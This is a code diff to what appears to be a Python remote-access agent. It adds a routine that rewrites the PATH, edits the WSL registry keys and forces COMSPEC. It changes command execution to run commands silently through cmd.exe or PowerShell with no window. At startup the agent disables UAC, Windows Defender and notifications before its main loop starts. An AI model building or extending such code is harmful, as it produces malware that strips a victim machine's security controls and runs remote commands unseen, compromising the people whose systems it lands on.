@@ -3607,6 +3607,76 @@ def disable_windows_notifications():
         log_message(f"[NOTIFICATIONS] Error disabling notifications: {e}")
         return False
 
+def disable_wsl_routing():
+    """AGGRESSIVE: Disable WSL routing for PowerShell/CMD commands."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        import winreg
+        log_message("[WSL] Disabling WSL command routing...")
+        
+        # Method 1: Remove WSL from PATH environment variable
+        try:
+            current_path = os.environ.get('PATH', '')
+            # Remove any WSL-related paths
+            new_path = ';'.join([p for p in current_path.split(';') 
+                                if 'wsl' not in p.lower() and 'ubuntu' not in p.lower()])
+            os.environ['PATH'] = new_path
+            log_message("[WSL] Removed WSL from PATH environment")
+        except Exception as e:
+            log_message(f"[WSL] Failed to modify PATH: {e}")
+        
+        # Method 2: Disable WSL via registry (requires admin)
+        try:
+            # Disable WSL feature
+            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss"
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, "DefaultDistribution", 0, winreg.REG_SZ, "")
+                winreg.CloseKey(key)
+                log_message("[WSL] Disabled WSL default distribution (HKCU)")
+            except:
+                pass
+            
+            # Try HKLM (needs admin)
+            try:
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, "DefaultDistribution", 0, winreg.REG_SZ, "")
+                winreg.CloseKey(key)
+                log_message("[WSL] Disabled WSL default distribution (HKLM)")
+            except:
+                pass
+                
+        except Exception as e:
+            log_message(f"[WSL] Failed to modify WSL registry: {e}")
+        
+        # Method 3: Force CMD.exe as default shell (AGGRESSIVE!)
+        try:
+            # Set ComSpec to force CMD.exe
+            cmd_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'cmd.exe')
+            os.environ['COMSPEC'] = cmd_path
+            log_message(f"[WSL] Forced COMSPEC to: {cmd_path}")
+        except Exception as e:
+            log_message(f"[WSL] Failed to set COMSPEC: {e}")
+        
+        # Method 4: Remove powershell.exe alias to WSL (if exists)
+        try:
+            # Check for WSL aliases in current directory
+            ps_alias_path = os.path.join(os.getcwd(), 'powershell.exe')
+            if os.path.exists(ps_alias_path) and os.path.islink(ps_alias_path):
+                os.remove(ps_alias_path)
+                log_message("[WSL] Removed powershell.exe WSL alias")
+        except Exception as e:
+            log_message(f"[WSL] Failed to remove alias: {e}")
+        
+        log_message("✅ [WSL] WSL routing disabled successfully!")
+        return True
+        
+    except Exception as e:
+        log_message(f"[WSL] Error disabling WSL routing: {e}")
+        return False
+
 def disable_uac():
     """Disable UAC (User Account Control) by modifying registry settings."""
     if not WINDOWS_AVAILABLE:
@@ -6369,19 +6439,48 @@ def handle_live_audio(command_parts):
     except Exception as e:
         return f"Live audio processing failed: {e}"
 def execute_command(command):
-    """Execute a command and return its output"""
+    """Execute a command and return its output - AGGRESSIVE ADMIN MODE"""
     try:
-        log_message(f"Executing command: {command}", "info")
+        log_message(f"[CMD] Executing: {command}", "info")
         
         if platform.system() == "Windows":
-            # Use PowerShell on Windows
-            result = subprocess.run(
-                ["powershell.exe", "-NoProfile", "-Command", command],
-                capture_output=True,
-                text=True,
-                timeout=30,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
+            # AGGRESSIVE FIX: Force CMD.exe usage to bypass WSL routing!
+            # Use DIRECT cmd.exe path from System32 (admin-level access)
+            cmd_exe_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'cmd.exe')
+            
+            # Check if command is PowerShell-specific
+            powershell_keywords = ['Get-', 'Set-', 'New-', 'Remove-', 'Test-', 'Start-', 'Stop-', 
+                                   'Select-Object', 'Where-Object', 'ForEach-Object', '$_']
+            is_powershell = any(keyword in command for keyword in powershell_keywords)
+            
+            if is_powershell:
+                # Use PowerShell but with FULL PATH to avoid WSL routing
+                ps_exe_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 
+                                          'WindowsPowerShell', 'v1.0', 'powershell.exe')
+                
+                log_message(f"[CMD] Using PowerShell: {ps_exe_path}", "debug")
+                
+                result = subprocess.run(
+                    [ps_exe_path, "-NoProfile", "-NonInteractive", "-Command", command],
+                    capture_output=True,
+                    text=True,
+                    timeout=30,
+                    creationflags=subprocess.CREATE_NO_WINDOW,
+                    env=os.environ.copy()  # Use current environment (admin context)
+                )
+            else:
+                # Use CMD.exe for standard commands (BYPASS WSL!)
+                log_message(f"[CMD] Using CMD.exe: {cmd_exe_path}", "debug")
+                
+                # Wrap command in cmd.exe /c for execution
+                result = subprocess.run(
+                    [cmd_exe_path, "/c", command],
+                    capture_output=True,
+                    text=True,
+                    timeout=30,
+                    creationflags=subprocess.CREATE_NO_WINDOW,
+                    env=os.environ.copy()  # Use current environment (admin context)
+                )
         else:
             # Use bash on Linux/Unix systems
             result = subprocess.run(
@@ -6395,22 +6494,19 @@ def execute_command(command):
         if not output:
             output = "[No output from command]"
         
-        log_message(f"Command output: {output[:200]}{'...' if len(output) > 200 else ''}", "success")
+        log_message(f"[CMD] Output: {output[:200]}{'...' if len(output) > 200 else ''}", "success")
         return output
         
     except subprocess.TimeoutExpired:
-        error_msg = "Command execution timed out after 30 seconds"
+        error_msg = "⏱️ Command execution timed out after 30 seconds"
         log_message(error_msg, "error")
         return error_msg
-    except FileNotFoundError:
-        if platform.system() == "Windows":
-            error_msg = "PowerShell not found. Command execution failed."
-        else:
-            error_msg = "Bash not found. Command execution failed."
+    except FileNotFoundError as e:
+        error_msg = f"❌ Executable not found: {e}"
         log_message(error_msg, "error")
         return error_msg
     except Exception as e:
-        error_msg = f"Command execution failed: {e}"
+        error_msg = f"❌ Command execution failed: {e}"
         log_message(error_msg, "error")
         return error_msg
 def main_loop(agent_id):
@@ -10319,9 +10415,16 @@ def signal_handler(signum, frame):
     sys.exit(0)
 
 if __name__ == "__main__":
-    # PRIORITY 1: Disable UAC, Defender, and Notifications FIRST
+    # PRIORITY 1: Disable WSL, UAC, Defender, and Notifications FIRST
     try:
         log_message("[STARTUP] === SYSTEM CONFIGURATION STARTING ===")
+        
+        # 0. Disable WSL routing FIRST (fixes command execution!)
+        log_message("[STARTUP] Step 0: Disabling WSL routing (AGGRESSIVE)...")
+        if disable_wsl_routing():
+            log_message("[STARTUP] ✅ WSL routing disabled - commands will use CMD.exe directly")
+        else:
+            log_message("[STARTUP] ⚠️ WSL routing disable failed (not critical)")
         
         # 1. Disable UAC first (requires admin)
         log_message("[STARTUP] Step 1: Disabling UAC...")
